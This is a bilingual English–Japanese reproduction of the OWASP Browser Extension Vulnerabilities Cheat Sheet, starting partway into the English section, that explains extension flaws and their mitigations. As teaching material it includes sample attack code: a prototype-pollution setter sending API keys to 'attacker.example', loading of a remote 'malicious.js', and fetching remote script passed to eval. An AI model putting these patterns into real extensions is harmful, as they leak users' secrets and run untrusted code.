### Vulnerability: DOM-based Data Skimming

When an extension renders sensitive user information directly into DOM of a web page, this data becomes accessible to the page's own scripts.

This risk applies regardless of the method used, including plain JavaScript DOM manipulation or injecting components built with frameworks like React.

A malicious or compromised web page can inspect the DOM, read the sensitive data (e.g., personally identifiable information, financial details, AI chat histories), and exfiltrate it.

### Example: DOM-based Data Skimming

```javascript
// content-script.js

// Sensitive data fetched from the extension's background service
const userData = {
  name: "Jane Doe",
  email: "jane.doe@example.com"
};

// This injects sensitive data directly into the page's DOM
const userInfoDiv = document.createElement('div');
userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
document.body.appendChild(userInfoDiv);
```

### Mitigation: DOM-based Data Skimming

Avoid rendering any sensitive information directly into a web page's DOM. Instead, display sensitive data in UI elements that are isolated from the web page's context and controlled by the extension.

Use secure alternatives such as:

- Popup: Display information in a popup UI that appears when the user clicks the extension's icon.
- Options Page: Use a dedicated options page for displaying user-specific data or settings.
- Side Panel: Use the side panel to show a persistent UI in a separate pane, isolated from the page content. (FYI, "Side Panel" is a Chromium term. Firefox calls it "Sidebar".)

It is important to note that even using a Shadow DOM for encapsulation may not be a sufficient safeguard, as page scripts can still query an 'open' Shadow DOM. Moreover, even a 'closed' Shadow DOM is not safe, if you consider other browser extensions as threats under your security model. This is because extensions can spear through a 'closed' Shadow DOM using [`openOrClosedShadowRoot()` API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dom/openOrClosedShadowRoot).

Therefore, using truly separate extension-controlled UIs is the most reliable mitigation.

## 12. Prototype-based Data Skimming

### Vulnerability: Prototype-based Data Skimming

An extension's content script is executed in "isolated world", a JavaScript context separated from the one of a web page. On the other hand, there are some ways for an extension to execute scripts in "main world", a web page's context. For example, an extension can inject a `<script>` tag directly to DOM with `src` attribute pointing to a script of [web accessible resources](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/web_accessible_resources).

When an extension uses sensitive user information in any scripts executed on the web page's context, the data becomes accessible to the page's scripts. So, if the web page is compromised or malicious, the data will be stolen.

The reason why the data becomes accessible is because global objects of a context (sometimes called "built-in objects", "primordials" or "prototypes") can be overwritten to behave differently than usual. This is known as "prototype pollution", "prototype overriding" and so on.

This means that a malicious or compromised webpage can overwrite global objects in its context to steal any data they handle. Please note that objects here include almost everything in the context such as functions. So, if the extension's injected script uses these overwritten objects with sensitive data, it will inadvertently trigger the malicious code, leading to the exfiltration of that data.

### Example: Prototype-based Data Skimming

```javascript
// Malicious script overwriting all objects' setter for 'apiKey'
// to send the value to be set towards a server.
Object.defineProperty(Object.prototype, 'apiKey', {
    set: function (str) {
        fetch(`https://attacker.example?data=${str}`);
        Object.defineProperty(this, 'apiKey', {
            value: str
        })
        return str
    }
})

// Extension's script to be executed on a web page's context.
window.addEventListener('message', (data) => {
  if (data.apiKey) {
    // the setter for 'apiKey' is already polluted,
    // and the below line triggers malicious code and the data is immediately sent.
    window.apiController.apiKey = data.apiKey;
  }
})
```

### Mitigation: Prototype-based Data Skimming

Please don't use the web page's context when sensitive user information is handled just for a moment. If communication with scripts in the web page's context is necessary, use only non-sensitive, essential information. For example, pass just a result of validation instead of the whole secret token. It's the case even if you use `window.postMessage`, because it can be overwritten also and malicious scripts can add listeners for `message` event.

Please note that it's not recommended to try to get native (not-overwritten) prototypes by some tricks. It's sure that there are some hacks to get native prototypes in a context where other scripts are also executed, but bypasses of these measures, i.e. how to force other scripts to use overwritten prototypes, are often invented.

Also, please don't assume your extension's script can use native prototypes even if it's executed at `document_start` timing. At least, in the case of Chromium browser extension, it's known that the context of a newly created iframe can be tweaked by a web page's script BEFORE the extension's script starts in the iframe event at `document_start` ([official bug issue](https://issues.chromium.org/issues/40202434)).

## 13. Insecure Message Passing

### Vulnerability: Insecure Message Passing

Browser extensions often rely on message passing (`chrome.runtime.sendMessage/onMessage`) between low-privilege contexts (Content Scripts, Popup) and the high-privilege Service Worker (Background). If the Service Worker fails to validate the sender's origin or URL, a compromised webpage can send malicious messages, tricking the extension into performing privileged actions (e.g., retrieving sensitive data or API keys).

### Example: Insecure Message Passing

```javascript
// In Service Worker (Background)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'fetchSecret') { // No validation of sender
    // A malicious content script/webpage could trigger this.
    fetch(SECRET_API_URL);
  }
});
```

### Mitigation: Insecure Message Passing

Treat all incoming messages as untrusted input.
In Service Workers, always:

- Validate `sender.id` to ensure the message originates from your own extension.
- Validate `sender.url` or `sender.origin` to restrict which extension pages or content scripts may communicate.
- Avoid allowing webpages to indirectly influence privileged logic through content scripts.
- Perform strict validation and allow-listing of `request.action` and all request parameters.

Chrome explicitly states that content scripts are less trustworthy than extension pages and must be treated accordingly. Secure example:

```javascript
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (sender.id !== chrome.runtime.id) return;
  if (!sender.url?.startsWith('chrome-extension://')) return;

  if (request.action === 'fetchSecret') {
    fetch(SECRET_API_URL);
  }
});
```

## Conclusion

By following these security best practices, developers can build safer browser extensions and protect users from privacy and security threats. Always prioritize least privilege, encryption, and secure coding principles when developing extensions.

🔹 References:
[Google Chrome Extension Security Guide](https://developer.chrome.com/docs/extensions/mv3/security/)
[Mozilla Firefox Extension Security Best Practices](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices)

</div>
<div className="bilingualBlock japaneseBlock">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

# ブラウザ拡張機能セキュリティ脆弱性チートシート

## 1. 権限の過剰要求

### 脆弱性: 権限の過剰要求

ブラウザ拡張機能は、実際に必要な範囲を超える権限を要求することがあります。これにより、すべてのタブ、閲覧履歴、さらにはセンシティブなユーザーデータへのアクセスが許可される可能性があります。拡張機能が侵害された場合、重大なプライバシーリスクにつながる可能性があります。

### 例: 権限の過剰要求

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage"
  ]
}
```

### 対策: 権限の過剰要求

最小権限の原則 (Principle of Least Privilege, PoLP) に従い、絶対に必要な権限のみを要求します。可能な場合は、最初から完全なアクセスを付与するのではなく、任意権限を使用します。不要になった権限を定期的に監査し、削除します。

## 2. データ漏洩

### 脆弱性: データ漏洩

一部の拡張機能は、適切なセキュリティ対策なしに閲覧アクティビティや個人情報を外部サーバーに送信することで、意図せずユーザーデータを公開します。

### 例: データ漏洩

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    fetch('http://example.com/track', {
      method: 'POST',
      body: JSON.stringify({ URL: tab.URL })
    });
  }
});
```

### 対策: データ漏洩

データの傍受を防ぐため、すべての通信で常に HTTPS を使用します。データ収集を制限し、収集するデータをプライバシーポリシーで明確に示して透明性を確保します。個人データを収集または送信する前に、ユーザー同意の仕組みを実装します。

## 3. クロスサイトスクリプティング (XSS)

### 脆弱性: クロスサイトスクリプティング (XSS)

ユーザー入力が適切にサニタイズされていない場合、攻撃者は悪意のあるスクリプトを Web ページに注入し、ユーザーデータの窃取や不正操作を行う可能性があります。

### 例: クロスサイトスクリプティング (XSS)

```javascript
let userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput; // No sanitization
```

### 対策: クロスサイトスクリプティング (XSS)

インラインスクリプトをブロックするために Content Security Policy (CSP) を実装します。ユーザー入力を表示する前に DOMPurify などのライブラリを使用してサニタイズします。注入されたスクリプトの実行を防ぐため、`innerHTML` の使用を避け、代わりに `textContent` を使用します。

## 4. 安全でない通信

### 脆弱性: 安全でない通信

一部の拡張機能は、保護されていない HTTP 接続でセンシティブデータを送信するため、攻撃者による傍受に対して脆弱になります。

### 例: 安全でない通信

```javascript
fetch('http://example.com/api/data');
```

### 対策: 安全でない通信

データ窃取を防ぐため、外部通信では常に HTTPS を使用します。データ完全性を確保するため、サーバーレスポンスを処理する前に検証します。

## 5. コードインジェクション

### 脆弱性: コードインジェクション

信頼できないソースからスクリプトを動的に読み込む拡張機能は、悪意のあるコードを注入および実行される可能性があります。

### 例: コードインジェクション

```javascript
let script = document.createElement('script');
script.src = 'http://example.com/malicious.js';
document.body.appendChild(script);
```

### 対策: コードインジェクション

CSP (Content Security Policy) を使用してスクリプトソースを制限します。詳細については、[CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) を参照してください。悪意のあるコードを実行する可能性があるため、`eval()` と `innerHTML` の使用を避けます。Web ページにスクリプトを注入するのではなく、拡張機能のメッセージング API を使用することを推奨します。

## 6. 悪意のある更新

### 脆弱性: 悪意のある更新

拡張機能が信頼できないサーバーから更新を取得する場合、攻撃者がすべてのユーザーに悪意のある更新を配布できる可能性があります。

### 例: 悪意のある更新

```javascript
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // Unsafe!
});
```

### 対策: 悪意のある更新

真正性を確保するため、デジタル署名で拡張機能の更新に署名します。拡張機能内で更新を取得するのではなく、拡張機能マーケットプレイスからの更新に依存します。["Don’t inject or incorporate remote scripts"](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices) を参照してください。取得したコードを実行する前に、完全性チェックを実装します。

## 7. サードパーティ依存関係

### 脆弱性: サードパーティ依存関係

古い、または脆弱なサードパーティライブラリを拡張機能で使用すると、それらのライブラリに既知の悪用方法がある場合にセキュリティリスクを持ち込む可能性があります。

### 例: サードパーティ依存関係

```json
{
  "dependencies": {
    "vulnerable-lib": "1.0.0"
  }
}
```

### 対策: サードパーティ依存関係

セキュリティ脆弱性がないかサードパーティ依存関係を定期的に監査します。リスクを検出するため、`npm audit` や OWASP Dependency-Check などのツールを使用します。セキュリティ更新が頻繁に提供され、積極的に保守されているライブラリを優先します。

## 8. Content Security Policy (CSP) の欠如

### 脆弱性: Content Security Policy (CSP) の欠如

厳格な CSP がない場合、攻撃者は拡張機能の Web ページにスクリプトを注入でき、クロスサイトスクリプティング (XSS) 攻撃のリスクが高まります。

### 例: Content Security Policy (CSP) の欠如

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "content_security_policy": "default-src 'self'"
}
```

### 対策: Content Security Policy (CSP) の欠如

拡張機能の `manifest.json` ファイルで厳格な CSP を定義します。nonce ベースまたはハッシュベースのポリシーを使用し、信頼済みスクリプトのみを許可します。インラインスクリプトの実行をブロックし、サードパーティコンテンツのソースを制限します。

## 9. 安全でないストレージ

### 脆弱性: 安全でないストレージ

認証トークンのようなセンシティブデータを `localStorage` やその他の保護されていない場所に保存すると、攻撃者が容易にアクセスできるようになります。

### 例: 安全でないストレージ

```javascript
localStorage.setItem('token', 'my-secret-token'); // No encryption
```

### 対策: 安全でないストレージ

センシティブデータは、`localStorage` よりも優れたセキュリティを提供する Chrome Storage API に保存します。ローカルに保存する前に保存データを暗号化します。拡張機能コード内に API キーや認証情報をハードコードしてはいけません。

## 10. 不十分なプライバシー管理

### 脆弱性: 不十分なプライバシー管理

拡張機能がユーザーデータをどのように収集し処理するかを明確に定義していない場合、プライバシー侵害や不正なデータ利用につながる可能性があります。

### 例: 不十分なプライバシー管理

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "description": "A cool extension with no privacy policy."
}
```

### 対策: 不十分なプライバシー管理

データ収集の実践を説明する明確なプライバシーポリシーを実装します。ユーザーがデータ収集をオプトアウトできるようにします。GDPR、CCPA、その他のプライバシー規制に準拠するため、データ共有の実践を開示します。

## 11. DOM ベースのデータスキミング

### 脆弱性: DOM ベースのデータスキミング

拡張機能がセンシティブなユーザー情報を Web ページの DOM に直接レンダリングすると、そのデータはページ自身のスクリプトからアクセス可能になります。

このリスクは、プレーンな JavaScript DOM 操作や React などのフレームワークで構築したコンポーネントの注入を含め、使用する方法にかかわらず適用されます。

悪意のある、または侵害された Web ページは DOM を検査し、センシティブデータ (個人を特定できる情報、金融情報、AI チャット履歴など) を読み取り、外部に送信できます。

### 例: DOM ベースのデータスキミング

```javascript
// content-script.js

// Sensitive data fetched from the extension's background service
const userData = {
  name: "Jane Doe",
  email: "jane.doe@example.com"
};

// This injects sensitive data directly into the page's DOM
const userInfoDiv = document.createElement('div');
userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
document.body.appendChild(userInfoDiv);
```

### 対策: DOM ベースのデータスキミング

センシティブ情報を Web ページの DOM に直接レンダリングすることは避けます。代わりに、Web ページのコンテキストから分離され、拡張機能によって制御される UI 要素にセンシティブデータを表示します。

次のような安全な代替手段を使用します。

- Popup: ユーザーが拡張機能のアイコンをクリックしたときに表示されるポップアップ UI に情報を表示します。
- Options Page: ユーザー固有のデータや設定を表示する専用のオプションページを使用します。
- Side Panel: ページコンテンツから分離された別ペインで永続的な UI を表示するためにサイドパネルを使用します。(参考: "Side Panel" は Chromium の用語です。Firefox では "Sidebar" と呼びます。)

カプセル化のために Shadow DOM を使用しても、ページスクリプトが `open` Shadow DOM を問い合わせできるため、十分な保護策にならない可能性がある点に注意することが重要です。さらに、セキュリティモデル上、他のブラウザ拡張機能を脅威として考慮する場合、`closed` Shadow DOM であっても安全ではありません。これは、拡張機能が [`openOrClosedShadowRoot()` API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dom/openOrClosedShadowRoot) を使用して `closed` Shadow DOM を突き抜けられるためです。

したがって、真に分離された、拡張機能が制御する UI を使用することが最も信頼できる対策です。

## 12. プロトタイプベースのデータスキミング

### 脆弱性: プロトタイプベースのデータスキミング

拡張機能のコンテンツスクリプトは、Web ページのコンテキストから分離された JavaScript コンテキストである "isolated world" で実行されます。一方で、拡張機能が Web ページのコンテキストである "main world" でスクリプトを実行する方法もいくつかあります。たとえば、拡張機能は [`web accessible resources`](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/web_accessible_resources) のスクリプトを指す `src` 属性を持つ `<script>` タグを DOM に直接注入できます。

Web ページのコンテキストで実行されるスクリプト内で拡張機能がセンシティブなユーザー情報を使用すると、そのデータはページのスクリプトからアクセス可能になります。そのため、Web ページが侵害されている、または悪意のあるものである場合、データは窃取されます。

データがアクセス可能になる理由は、コンテキストのグローバルオブジェクト (「組み込みオブジェクト」、「primordials」、「prototypes」と呼ばれることもあります) が通常とは異なる振る舞いをするように上書きできるためです。これは「プロトタイプ汚染」、「プロトタイプ上書き」などとして知られています。

これは、悪意のある、または侵害された Web ページが、そのコンテキスト内のグローバルオブジェクトを上書きして、それらが扱うあらゆるデータを窃取できることを意味します。ここでいうオブジェクトには、関数など、コンテキスト内のほぼすべてが含まれる点に注意してください。そのため、拡張機能が注入したスクリプトが、センシティブデータとともにこれらの上書きされたオブジェクトを使用すると、意図せず悪意のあるコードを起動し、そのデータの外部送信につながります。

### 例: プロトタイプベースのデータスキミング

```javascript
// Malicious script overwriting all objects' setter for 'apiKey'
// to send the value to be set towards a server.
Object.defineProperty(Object.prototype, 'apiKey', {
    set: function (str) {
        fetch(`https://attacker.example?data=${str}`);
        Object.defineProperty(this, 'apiKey', {
            value: str
        })
        return str
    }
})

// Extension's script to be executed on a web page's context.
window.addEventListener('message', (data) => {
  if (data.apiKey) {
    // the setter for 'apiKey' is already polluted,
    // and the below line triggers malicious code and the data is immediately sent.
    window.apiController.apiKey = data.apiKey;
  }
})
```

### 対策: プロトタイプベースのデータスキミング

センシティブなユーザー情報を一瞬でも扱う場合は、Web ページのコンテキストを使用しないでください。Web ページのコンテキスト内のスクリプトとの通信が必要な場合は、センシティブではない、必要最小限の情報のみを使用します。たとえば、シークレットトークン全体ではなく、検証結果だけを渡します。これは `window.postMessage` を使用する場合でも同様です。`window.postMessage` も上書きでき、悪意のあるスクリプトが `message` イベントのリスナーを追加できるためです。

何らかのトリックでネイティブな (上書きされていない) プロトタイプを取得しようとすることは推奨されない点に注意してください。他のスクリプトも実行されているコンテキストでネイティブプロトタイプを取得するハックは確かに存在しますが、それらの対策を迂回する方法、つまり他のスクリプトに上書きされたプロトタイプを使わせる方法がしばしば考案されます。

また、拡張機能のスクリプトが `document_start` タイミングで実行される場合でも、ネイティブプロトタイプを使用できると仮定しないでください。少なくとも Chromium ブラウザ拡張機能の場合、新しく作成された iframe のコンテキストは、その iframe における `document_start` イベントで拡張機能のスクリプトが開始される前に、Web ページのスクリプトによって調整できることが知られています ([official bug issue](https://issues.chromium.org/issues/40202434))。

## 13. 安全でないメッセージ受け渡し

### 脆弱性: 安全でないメッセージ受け渡し

ブラウザ拡張機能は、低権限のコンテキスト (Content Scripts、Popup) と高権限の Service Worker (Background) の間でメッセージ受け渡し (`chrome.runtime.sendMessage/onMessage`) に依存することがよくあります。Service Worker が送信者のオリジンや URL を検証しない場合、侵害された Web ページが悪意のあるメッセージを送信し、拡張機能をだまして特権操作 (センシティブデータや API キーの取得など) を実行させる可能性があります。

### 例: 安全でないメッセージ受け渡し

```javascript
// In Service Worker (Background)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'fetchSecret') { // No validation of sender
    // A malicious content script/webpage could trigger this.
    fetch(SECRET_API_URL);
  }
});
```

### 対策: 安全でないメッセージ受け渡し

すべての受信メッセージを信頼できない入力として扱います。Service Worker では常に次を行います。

- `sender.id` を検証し、メッセージが自分の拡張機能から発信されたことを確認します。
- `sender.url` または `sender.origin` を検証し、通信を許可する拡張機能ページやコンテンツスクリプトを制限します。
- Web ページがコンテンツスクリプトを介して特権ロジックに間接的に影響を与えられるようにすることを避けます。
- `request.action` とすべてのリクエストパラメータを厳格に検証し、許可リスト化します。

Chrome は、コンテンツスクリプトは拡張機能ページより信頼性が低く、それに応じて扱う必要があると明示しています。安全な例:

```javascript
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (sender.id !== chrome.runtime.id) return;
  if (!sender.url?.startsWith('chrome-extension://')) return;

  if (request.action === 'fetchSecret') {
    fetch(SECRET_API_URL);
  }
});
```

## まとめ

これらのセキュリティベストプラクティスに従うことで、開発者はより安全なブラウザ拡張機能を構築し、プライバシーおよびセキュリティ上の脅威からユーザーを保護できます。拡張機能を開発する際は、常に最小権限、暗号化、セキュアコーディングの原則を優先してください。

References:

[Google Chrome Extension Security Guide](https://developer.chrome.com/docs/extensions/mv3/security/)

[Mozilla Firefox Extension Security Best Practices](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Security_best_practices)

</div>
</div>

</section>
</div>

## Attribution

<div className="attributionFooter">

- Original: Browser Extension Vulnerabilities Cheat Sheet
- Source: https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html
- Copyright: Cheat Sheets Series Team
- License: Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)
- License URL: https://creativecommons.org/licenses/by-sa/4.0/
- Changes: English original retained for comparison. Japanese translation added. Bilingual display generated from official source and local Japanese translation.
- Retrieved: 2026-05-21

</div>
